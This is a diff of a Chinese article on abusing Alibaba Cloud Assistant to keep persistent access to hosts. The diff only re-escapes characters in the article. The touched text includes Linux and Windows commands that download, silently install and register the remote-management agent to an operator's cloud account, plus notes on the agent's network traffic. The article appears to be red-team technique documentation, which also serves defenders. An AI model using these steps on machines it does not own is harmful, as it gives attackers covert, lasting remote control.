@@ -13,13 +13,13 @@
 
 但实际上也可以针对终端主机进行远程运维，因此可以用于实现权限维持。
 
-> 官方文档：
->
-> https://help.aliyun.com/zh/ecs/user-guide/overview-10
+&gt; 官方文档：
+&gt;
+&gt; https://help.aliyun.com/zh/ecs/user-guide/overview-10
 
 ## 利用
 
-1、打开阿里云控制台，依次找到 产品与服务 -> 云服务器 ECS -> 运维与监控 -> 发送命令/文件（云助手） -> 托管实例 -> 创建注册码：
+1、打开阿里云控制台，依次找到 产品与服务 -&gt; 云服务器 ECS -&gt; 运维与监控 -&gt; 发送命令/文件（云助手） -&gt; 托管实例 -&gt; 创建注册码：
 
 ![image-20230817023716768](resource/Ali云助手权限维持.assets/image-20230817023716768.png)
 
@@ -58,9 +58,9 @@
 ```shell
 sudo wget https://aliyun-client-assist.oss-accelerate.aliyuncs.com/linux/aliyun_assist_latest.rpm
 sudo rpm -ivh aliyun_assist_latest.rpm --force 
-sudo aliyun-service --register --RegionId "cn-hangzhou" \
-   --ActivationCode "a-hz012xxxxxL47fD/f" \
-   --ActivationId "1DA9xxxxxxD244E7"
+sudo aliyun-service --register --RegionId &#34;cn-hangzhou&#34; \
+   --ActivationCode &#34;a-hz012xxxxxL47fD/f&#34; \
+   --ActivationId &#34;1DA9xxxxxxD244E7&#34;
 ```
 
 **Linux(.deb)**
@@ -68,20 +68,20 @@ sudo aliyun-service --register --RegionId "cn-hangzhou" \
 ```shell
 sudo wget https://aliyun-client-assist.oss-accelerate.aliyuncs.com/linux/aliyun_assist_latest.deb
 sudo dpkg -i aliyun_assist_latest.deb
-sudo aliyun-service --register --RegionId "cn-hangzhou" \
-   --ActivationCode "a-hz012xxxxxx47fD/f" \
-   --ActivationId "1DA9xxxxxx3D244E7"
+sudo aliyun-service --register --RegionId &#34;cn-hangzhou&#34; \
+   --ActivationCode &#34;a-hz012xxxxxx47fD/f&#34; \
+   --ActivationId &#34;1DA9xxxxxx3D244E7&#34;
 ```
 
 **Windows**
 
 ```powershell
 Invoke-WebRequest -Uri `
-'https://aliyun-client-assist.oss-accelerate.aliyuncs.com/windows/aliyun_agent_latest_setup.exe' `
--OutFile 'C:\\aliyun_agent_latest_setup.exe'
-&"C:\\aliyun_agent_latest_setup.exe" '/S' '--register' `
-'--RegionId="cn-hangzhou"' '--ActivationCode="a-hz012xxxxvttL47fD/f"' `
-'--ActivationId="1DA9xxxxx244E7"'
+&#39;https://aliyun-client-assist.oss-accelerate.aliyuncs.com/windows/aliyun_agent_latest_setup.exe&#39; `
+-OutFile &#39;C:\\aliyun_agent_latest_setup.exe&#39;
+&amp;&#34;C:\\aliyun_agent_latest_setup.exe&#34; &#39;/S&#39; &#39;--register&#39; `
+&#39;--RegionId=&#34;cn-hangzhou&#34;&#39; &#39;--ActivationCode=&#34;a-hz012xxxxvttL47fD/f&#34;&#39; `
+&#39;--ActivationId=&#34;1DA9xxxxx244E7&#34;&#39;
 ```
 
 生成的注册码中的关键参数就是 ActivationId值 和 ActivationCode值，Id和Code互相相互对应，可点击 “注册新实例” 处，查看过去建立生成的 ActivationId 值，但 ActivationCode值不可查。
@@ -161,7 +161,7 @@ Invoke-WebRequest -Uri `
 
 **通信流量：**
 
-本地Agent上线后会先对域名进行解析，根据命令行中`--RegionId="cn-hangzhou"`的键值，会寻找相应的节点，这里就是`cn-hangzhou.axt.aliyuncs.com`。
+本地Agent上线后会先对域名进行解析，根据命令行中`--RegionId=&#34;cn-hangzhou&#34;`的键值，会寻找相应的节点，这里就是`cn-hangzhou.axt.aliyuncs.com`。
 
 ![image-20230817175441073](resource/Ali云助手权限维持.assets/image-20230817175441073.png)
 
